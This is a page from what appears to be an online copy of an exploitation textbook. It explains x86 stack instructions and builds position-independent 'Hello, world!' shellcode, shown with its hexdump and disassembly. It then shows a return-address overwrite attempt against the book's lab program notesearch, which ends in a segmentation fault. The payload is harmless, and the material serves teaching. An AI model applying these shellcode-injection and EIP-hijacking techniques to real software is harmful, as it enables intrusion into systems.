<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x521 Assembly Instructions Using the Stack</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part117.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part119.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark107">0x521 Assembly Instructions Using the Stack</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">The stack is so integral to the <span class="s27">x</span>86 architecture that there are special instruc- tions for its operations.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="442" height="4" alt="image" src="Image_842.png"/></span></p><p class="s37" style="padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Instruction    Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="442" height="3" alt="image" src="Image_843.png"/></span></p><p class="s38" style="padding-left: 93pt;text-indent: 0pt;text-align: left;">push &lt;source&gt;   <span class="s48">Push the source operand to the stack.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">pop &lt;destination&gt; <span class="s48">Pop a value from the stack and store in the destination operand.</span></p><p class="s38" style="padding-top: 4pt;padding-left: 165pt;text-indent: -72pt;line-height: 108%;text-align: left;">call &lt;location&gt;  <span class="s48">Call a function, jumping the execution to the address in the location operand. This location can be relative or absolute. The address of the instruction following the call is pushed to the stack, so that execution can return later.</span></p><p class="s38" style="padding-top: 3pt;padding-bottom: 1pt;padding-left: 165pt;text-indent: -72pt;line-height: 109%;text-align: left;">ret      <span class="s48">Return from a function, popping the return address from the stack and jumping execution there.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="442" height="3" alt="image" src="Image_844.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Stack-based exploits are made possible by the <span class="s31">call </span>and <span class="s31">ret </span>instructions. When a function is called, the return address of the next instruction is pushed to the stack, beginning the stack frame. After the function is finished, the <span class="s31">ret </span>instruction pops the return address from the stack and jumps EIP back there. By overwriting the stored return address on the stack before the <span class="s31">ret </span>instruc- tion, we can take control of a programâ€™s execution.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This architecture can be misused in another way to solve the problem of addressing the inline string data. If the string is placed directly after a call instruction, the address of the string will get pushed to the stack as the return address. Instead of calling a function, we can jump past the string to a <span class="s31">pop </span>instruction that will take the address off the stack and into a register. The following assembly instructions demonstrate this technique.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">helloworld1.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_845.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32      ; Tell nasm this is 32-bit code.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">call mark_below  ; Call below the string to instructions</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">db &quot;Hello, world!&quot;, 0x0a, 0x0d ; with newline and carriage return bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">mark_below:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; ssize_t write(int fd, const void *buf, size_t count);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">pop ecx      ; Pop the return address (string ptr) into ecx. mov eax, 4    ; Write syscall #.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ebx, 1    ; STDOUT file descriptor</p><p class="s31" style="padding-top: 2pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">mov edx, 15   ; Length of the string</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; Do syscall: write(1, string, 14)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; void _exit(int status);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov eax, 1    ; Exit syscall #</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ebx, 0    ; Status = 0</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; Do syscall: exit(0)</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_846.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The call instruction jumps execution down below the string. This also pushes the address of the next instruction to the stack, the next instruction in our case being the beginning of the string. The return address can imme- diately be popped from the stack into the appropriate register. Without using any memory segments, these raw instructions, injected into an existing process, will execute in a completely position-independent way. This means that, when these instructions are assembled, they cannot be linked into an executable.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_847.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nasm helloworld1.s reader@hacking:~/booksrc $ ls -l helloworld1</p><p class="s31" style="padding-bottom: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">-rw-r--r-- 1 reader reader 50 2007-10-26 08:30 helloworld1</p><table style="border-collapse:collapse;margin-left:88.94pt" cellspacing="0"><tr style="height:11pt"><td style="width:336pt" colspan="4"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C helloworld1</p></td></tr><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">e8 0f 00 00 00 48 65 6c</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6c 6f 2c 20 77 6f 72 6c</p></td><td style="width:83pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|.....Hello, worl|</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000010</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">64 21 0a 0d 59 b8 04 00</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">00 00 bb 01 00 00 00 ba</p></td><td style="width:83pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|d!..Y.     |</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000020</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0f 00 00 00 cd 80 b8 01</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">00 00 00 bb 00 00 00 00</p></td><td style="width:83pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|        |</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000030</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">cd 80</p></td><td style="width:106pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:83pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|..|</p></td></tr><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000032</p></td><td style="width:106pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:106pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:83pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:11pt"><td style="width:336pt" colspan="4"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader@hacking:~/booksrc $ ndisasm -b32 helloworld1</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">E80F000000</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call 0x14</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000005</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">48</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">dec eax</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000006</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">656C</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">gs insb</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000008</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6C</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">insb</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000009</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6F</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">outsd</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000000A</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">2C20</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">sub al,0x20</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000000C</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">776F</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ja 0x7d</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000000E</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">726C</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jc 0x7c</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000010</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">64210A</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">and [fs:edx],ecx</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000013</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0D59B80400</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">or eax,0x4b859</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000018</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0000</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">add [eax],al</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000001A</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">BB01000000</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov ebx,0x1</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000001F</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">BA0F000000</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov edx,0xf</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000024</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CD80</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">int 0x80</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000026</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">B801000000</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov eax,0x1</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000002B</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">BB00000000</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov ebx,0x0</p></td></tr><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000030</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CD80</p></td><td style="width:232pt" colspan="2"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">int 0x80</p></td></tr><tr style="height:11pt"><td style="width:336pt" colspan="4"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader@hacking:~/booksrc $</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_848.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The <span class="s31">nasm </span>assembler converts assembly language into machine code and a corresponding tool called ndisasm converts machine code into assembly. These tools are used above to show the relationship between the machine code bytes and the assembly instructions. The disassembly instructions marked in bold are the bytes of the <span class="s31">&quot;Hello, world!&quot; </span>string interpreted as instructions.</p><p style="padding-left: 91pt;text-indent: 17pt;text-align: justify;">Now, if we can inject this shellcode into a program and redirect EIP, the program will print out <span class="s27">Hello, world! </span>Letâ€™s use the familiar exploit target of the notesearch program.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_849.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: justify;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld1) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch SHELLCODE will be at 0xbffff9c6</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\xc6\xf9\xff\xbf&quot;x40&#39;)</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- Segmentation fault reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_850.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Failure. Why do you think it crashed? In situations like this, GDB is your best friend. Even if you already know the reason behind this specific crash, learning how to effectively use a debugger will help you solve many other problems in the future.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part117.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part119.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
